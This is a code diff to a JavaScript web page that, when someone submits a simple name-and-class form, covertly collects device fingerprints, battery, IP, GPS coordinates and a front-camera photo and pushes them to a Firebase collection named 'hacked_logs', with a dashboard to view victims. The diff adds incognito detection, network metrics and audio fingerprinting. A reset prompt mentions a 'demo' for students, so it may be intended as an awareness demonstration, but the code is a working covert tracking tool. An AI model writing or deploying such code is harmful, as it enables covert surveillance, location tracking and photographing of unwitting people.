@@ -40,18 +40,84 @@ function getDeviceBrand() {
 }
 
 // ==========================================
-// 3. DEEP HARDWARE & SYSTEM FINGERPRINTING
+// 3. INCOGNITO MODE & STORAGE DETECTION
+// ==========================================
+async function detectIncognitoAndStorage() {
+    let isIncognito = false;
+    let storageEstimate = "Unknown";
+
+    try {
+        if (navigator.storage && navigator.storage.estimate) {
+            const { quota } = await navigator.storage.estimate();
+            const quotaInGB = Math.round(quota / (1024 * 1024 * 1024));
+            storageEstimate = `~${quotaInGB} GB Allocated`;
+
+            if (quota < 1200000000) { 
+                isIncognito = true;
+            }
+        }
+    } catch (e) {}
+
+    if (!isIncognito && window.webkitRequestFileSystem) {
+        window.webkitRequestFileSystem(
+            window.TEMPORARY, 100,
+            () => { isIncognito = false; },
+            () => { isIncognito = true; }
+        );
+    }
+
+    return {
+        mode: isIncognito ? "⚠️ INCOGNITO / PRIVATE WINDOW" : "Standard Browser",
+        storage: storageEstimate
+    };
+}
+
+// ==========================================
+// 4. LIVE NETWORK SPEED & PING METRICS
+// ==========================================
+function getNetworkMetrics() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "4G/WiFi";
+        const downlink = conn.downlink ? `${conn.downlink} Mbps` : "High Speed";
+        const rtt = conn.rtt ? `${conn.rtt} ms` : "30 ms";
+        return {
+            speed: `${type} (${downlink})`,
+            ping: rtt
+        };
+    }
+    return {
+        speed: "Cellular / Broadband",
+        ping: "~40 ms"
+    };
+}
+
+// ==========================================
+// 5. AUDIO HARDWARE FINGERPRINTING
+// ==========================================
+function getAudioFingerprint() {
+    try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return "Audio API Blocked";
+        const ctx = new AudioCtx();
+        const sampleRate = ctx.sampleRate ? `${ctx.sampleRate} Hz` : "48000 Hz";
+        const state = ctx.state || "active";
+        ctx.close();
+        return `DSP Engine (${sampleRate}, ${state})`;
+    } catch (e) {
+        return "Generic Audio Engine";
+    }
+}
+
+// ==========================================
+// 6. DEEP HARDWARE & SYSTEM FINGERPRINTING
 // ==========================================
 function getDeepHardwareSpecs() {
-    // CPU & Memory
     const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
     const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown";
-
-    // Screen & Display
     const screenRes = `${window.screen.width}x${window.screen.height}`;
     const touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "No Touch";
 
-    // GPU Renderer Detection
     let gpu = "Generic GPU";
     try {
         const canvas = document.createElement('canvas');
@@ -64,7 +130,6 @@ function getDeepHardwareSpecs() {
         }
     } catch (e) {}
 
-    // Locale & Language
     const language = navigator.language || "en-US";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Kolkata";
 
@@ -80,7 +145,7 @@ function getDeepHardwareSpecs() {
 }
 
 // ==========================================
-// 4. BATTERY STATUS TRACKER
+// 7. BATTERY STATUS TRACKER
 // ==========================================
 async function getBatteryStatus() {
     try {
@@ -98,7 +163,7 @@ async function getBatteryStatus() {
 }
 
 // ==========================================
-// 5. REAL IP & LOCATION DETAILS
+// 8. REAL IP & LOCATION DETAILS
 // ==========================================
 async function getIPAndNetworkDetails() {
     try {
@@ -119,7 +184,7 @@ async function getIPAndNetworkDetails() {
 }
 
 // ==========================================
-// 6. FRONT CAMERA SNAPSHOT CAPTURE FUNCTION
+// 9. FRONT CAMERA SNAPSHOT CAPTURE FUNCTION
 // ==========================================
 async function captureFrontCameraPhoto() {
     return new Promise((resolve) => {
@@ -167,7 +232,7 @@ async function captureFrontCameraPhoto() {
 }
 
 // ==========================================
-// 7. FORM SUBMIT FUNCTION (index.html)
+// 10. FORM SUBMIT FUNCTION (index.html)
 // ==========================================
 async function submitData(e) {
     if (e) e.preventDefault();
@@ -183,57 +248,81 @@ async function submitData(e) {
         return;
     }
 
-    // Deep Hardware & Device Details
+    // Telemetry Collection
     const device = getDeviceBrand();
     const deepSpecs = getDeepHardwareSpecs();
     const batteryStatus = await getBatteryStatus();
+    const incognitoData = await detectIncognitoAndStorage();
+    const netMetrics = getNetworkMetrics();
+    const audioFP = getAudioFingerprint();
 
-    // Live Network & IP Lookup
+    // IP & Carrier Lookup
     const netDetails = await getIPAndNetworkDetails();
     const realIP = netDetails.ip;
     const realNetwork = netDetails.network;
     let userLocation = netDetails.location;
 
-    // Capture Live Front Camera Photo
+    // Capture Camera Photo
     const capturedPhoto = await captureFrontCameraPhoto();
 
-    // GPS Precision Check
+    // GPS & Push Logic
+    const pushData = (locationStr) => {
+        pushToFirebase({
+            name: name,
+            class: studentClass,
+            device: device,
+            location: locationStr,
+            network: realNetwork,
+            ip: realIP,
+            battery: batteryStatus,
+            deepSpecs: deepSpecs,
+            incognito: incognitoData,
+            netMetrics: netMetrics,
+            audioFP: audioFP,
+            photo: capturedPhoto
+        });
+    };
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 let lat = position.coords.latitude.toFixed(4);
                 let lon = position.coords.longitude.toFixed(4);
-                let fullLocation = `GPS: ${lat}, ${lon} | ${userLocation}`;
-                pushToFirebase(name, studentClass, device, fullLocation, realNetwork, realIP, batteryStatus, deepSpecs, capturedPhoto);
+                pushData(`GPS: ${lat}, ${lon} | ${userLocation}`);
             },
             () => {
-                pushToFirebase(name, studentClass, device, userLocation, realNetwork, realIP, batteryStatus, deepSpecs, capturedPhoto);
+                pushData(userLocation);
             },
             { timeout: 5000 }
         );
     } else {
-        pushToFirebase(name, studentClass, device, userLocation, realNetwork, realIP, batteryStatus, deepSpecs, capturedPhoto);
+        pushData(userLocation);
     }
 }
 
-function pushToFirebase(name, studentClass, device, location, network, ip, battery, deepSpecs, photo) {
+function pushToFirebase(payload) {
     if (database) {
         database.ref('hacked_logs').push({
-            name: name,
-            class: studentClass,
-            device: device,
-            location: location,
-            network: network,
-            ip: ip,
-            battery: battery,
-            cpu: deepSpecs.cpuCores,
-            ram: deepSpecs.ram,
-            gpu: deepSpecs.gpu,
-            screen: deepSpecs.screenRes,
-            touch: deepSpecs.touchPoints,
-            lang: deepSpecs.language,
-            timezone: deepSpecs.timezone,
-            photo: photo || null,
+            name: payload.name,
+            class: payload.class,
+            device: payload.device,
+            location: payload.location,
+            network: payload.network,
+            ip: payload.ip,
+            battery: payload.battery,
+            cpu: payload.deepSpecs.cpuCores,
+            ram: payload.deepSpecs.ram,
+            gpu: payload.deepSpecs.gpu,
+            screen: payload.deepSpecs.screenRes,
+            touch: payload.deepSpecs.touchPoints,
+            lang: payload.deepSpecs.language,
+            timezone: payload.deepSpecs.timezone,
+            browserMode: payload.incognito.mode,
+            storage: payload.incognito.storage,
+            netSpeed: payload.netMetrics.speed,
+            ping: payload.netMetrics.ping,
+            audioHardware: payload.audioFP,
+            photo: payload.photo || null,
             time: new Date().toLocaleTimeString()
         }).then(() => {
             showWarningScreen();
@@ -258,7 +347,7 @@ document.addEventListener("DOMContentLoaded", () => {
 });
 
 // ==========================================
-// 8. REALTIME DASHBOARD LISTENER (dashboard.html)
+// 11. REALTIME DASHBOARD LISTENER (dashboard.html)
 // ==========================================
 if (document.getElementById('logsContainer')) {
     const logsContainer = document.getElementById('logsContainer');
@@ -308,12 +397,17 @@ if (document.getElementById('logsContainer')) {
                     Location: <span style="color: #ffcc00;">${data.location || 'Active'}</span>
                 </div>
 
+                <!-- INCOGNITO & NETWORK TELEMETRY -->
+                <div style="margin-top: 8px; padding: 6px 10px; background: rgba(255, 204, 0, 0.1); border-left: 3px solid #ffcc00; font-size: 11px; color: #ffcc00;">
+                    <b>🔍 PRIVACY & BANDWIDTH:</b> ${data.browserMode || 'Standard'} | Speed: <span style="color:#fff;">${data.netSpeed || '4G'}</span> (Ping: ${data.ping || '30ms'})
+                </div>
+
                 <!-- DEEP HARDWARE BREAKDOWN -->
-                <div style="margin-top: 8px; padding: 8px; background: rgba(255, 0, 60, 0.1); border: 1px dashed #ff003c; border-radius: 4px; font-size: 11px; color: #00e5ff;">
+                <div style="margin-top: 6px; padding: 8px; background: rgba(255, 0, 60, 0.1); border: 1px dashed #ff003c; border-radius: 4px; font-size: 11px; color: #00e5ff;">
                     <b>⚙️ DEEP HARDWARE PROFILE:</b><br>
                     CPU: <span style="color: #fff;">${data.cpu || 'N/A'}</span> | RAM: <span style="color: #fff;">${data.ram || 'N/A'}</span> | Display: <span style="color: #fff;">${data.screen || 'N/A'} (${data.touch || 'Touch'})</span><br>
                     GPU: <span style="color: #ffcc00;">${data.gpu || 'Mobile Graphics'}</span><br>
-                    Locale: <span style="color: #fff;">${data.lang || 'en'}</span> | Timezone: <span style="color: #fff;">${data.timezone || 'Asia/Kolkata'}</span>
+                    Audio Hardware: <span style="color: #00ff66;">${data.audioHardware || 'DSP Active'}</span> | Locale: <span style="color: #fff;">${data.lang || 'en'}</span>
                 </div>
 
                 ${photoHtml}
@@ -339,7 +433,7 @@ if (document.getElementById('logsContainer')) {
 }
 
 // ==========================================
-// 9. RESET ALL DATA FUNCTION
+// 12. RESET ALL DATA FUNCTION
 // ==========================================
 function resetAllData() {
     if (confirm("⚠️ Clear all student records for the new demo?")) {
